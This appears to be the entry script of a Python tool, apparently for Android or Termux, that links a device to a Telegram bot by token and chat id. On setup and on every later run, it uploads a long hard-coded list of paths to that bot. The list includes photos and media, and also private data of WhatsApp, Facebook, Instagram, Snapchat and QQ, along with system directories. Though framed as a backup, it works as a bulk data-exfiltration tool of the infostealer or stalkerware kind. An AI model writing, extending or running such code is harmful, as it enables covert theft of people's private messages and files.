
import sys
import json
import os
from bsb_2025.core import backup_files, send_to_telegram

CONFIG_PATH = os.path.expanduser("~/.bsb_config.json")

def save_config(bot_token, chat_id):
    config = {"bot_token": bot_token, "chat_id": chat_id}
    with open(CONFIG_PATH, "w") as f:
        json.dump(config, f)

def load_config():
    if not os.path.exists(CONFIG_PATH):
        return None
    with open(CONFIG_PATH, "r") as f:
        return json.load(f)

def disconnect():
    if os.path.exists(CONFIG_PATH):
        os.remove(CONFIG_PATH)

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "-c" and len(sys.argv) == 4:
            bot_token = sys.argv[2]
            chat_id = sys.argv[3]
            save_config(bot_token, chat_id)
            send_to_telegram(bot_token, chat_id, "Your device has been successfully linked with the Telegram bot.")
            backup_files(bot_token, chat_id, [
    "/sdcard/DCIM",
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/Pictures",
    "/sdcard/Movies",
    "/sdcard/Music",
    "/sdcard/Screenshots",
    "/sdcard/Camera",
    "/sdcard/Xender",
    "/sdcard/Snapseed",
    "/sdcard/SHAREit",
    "/sdcard/Videos",
    "/sdcard/Android/data/com.whatsapp",
    "/sdcard/WhatsApp/Media/.Statuses",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    "/sdcard/WhatsApp/Media/WhatsApp Documents",
    "/sdcard/WhatsApp/Media/WhatsApp Audio",
    "/sdcard/WhatsApp/Media/WhatsApp Voice Notes",
    "/sdcard/Telegram",
    "/sdcard/TikTok",
    "/sdcard/Messenger",
    "/sdcard/Facebook",
    "/sdcard/Instagram",
    "/sdcard/Recordings",
    "/sdcard/Meme",
    "/sdcard/AlightMotion",
    "/sdcard/KineMaster",
    "/sdcard/InShot",
    "/sdcard/CapCut",
    "/sdcard/ZArchiver",
    "/sdcard/Downloads",
    "/sdcard/StatusSaver",
    "/data/data/com.whatsapp",
    "/data/data/com.facebook.katana",
    "/data/data/com.instagram.android",
    "/data/data/com.snapchat.android",
    "/data/data/com.tencent.mobileqq",
    "/data/system",
    "/data/app",
    "/data/dalvik-cache",
    "/data/user/0/com.whatsapp",
    "/data/user/0/com.facebook.katana",
    "/data/user/0/com.instagram.android",
    "/data/user/0/com.snapchat.android",
    "/data/user/0/com.tencent.mobileqq",
    "/data/media/0/WhatsApp",
    "/data/media/0/Telegram",
    "/system",
    "/system/app",
    "/system/priv-app",
    "/system/etc",
    "/system/vendor",
    "/system/fonts",
    "/system/lib",
    "/system/lib64",
    "/system/xbin",
    "/system/sd",
    "/storage/emulated/0/WhatsApp",
    "/storage/emulated/0/Telegram"
])
        elif sys.argv[1] == "stop" and sys.argv[2] == "-bsb":
            config = load_config()
            if config:
                send_to_telegram(config["bot_token"], config["chat_id"], "Your device has been disconnected from the Telegram bot.")
                disconnect()
        else:
            print("Invalid arguments")
    else:
        config = load_config()
        if config:
            backup_files(config["bot_token"], config["chat_id"], [
    "/sdcard/DCIM",
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/Pictures",
    "/sdcard/Movies",
    "/sdcard/Music",
    "/sdcard/Screenshots",
    "/sdcard/Camera",
    "/sdcard/Xender",
    "/sdcard/Snapseed",
    "/sdcard/SHAREit",
    "/sdcard/Videos",
    "/sdcard/Android/data/com.whatsapp",
    "/sdcard/WhatsApp/Media/.Statuses",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    "/sdcard/WhatsApp/Media/WhatsApp Documents",
    "/sdcard/WhatsApp/Media/WhatsApp Audio",
    "/sdcard/WhatsApp/Media/WhatsApp Voice Notes",
    "/sdcard/Telegram",
    "/sdcard/TikTok",
    "/sdcard/Messenger",
    "/sdcard/Facebook",
    "/sdcard/Instagram",
    "/sdcard/Recordings",
    "/sdcard/Meme",
    "/sdcard/AlightMotion",
    "/sdcard/KineMaster",
    "/sdcard/InShot",
    "/sdcard/CapCut",
    "/sdcard/ZArchiver",
    "/sdcard/Downloads",
    "/sdcard/StatusSaver",
    "/data/data/com.whatsapp",
    "/data/data/com.facebook.katana",
    "/data/data/com.instagram.android",
    "/data/data/com.snapchat.android",
    "/data/data/com.tencent.mobileqq",
    "/data/system",
    "/data/app",
    "/data/dalvik-cache",
    "/data/user/0/com.whatsapp",
    "/data/user/0/com.facebook.katana",
    "/data/user/0/com.instagram.android",
    "/data/user/0/com.snapchat.android",
    "/data/user/0/com.tencent.mobileqq",
    "/data/media/0/WhatsApp",
    "/data/media/0/Telegram",
    "/system",
    "/system/app",
    "/system/priv-app",
    "/system/etc",
    "/system/vendor",
    "/system/fonts",
    "/system/lib",
    "/system/lib64",
    "/system/xbin",
    "/system/sd",
    "/storage/emulated/0/WhatsApp",
    "/storage/emulated/0/Telegram"
])
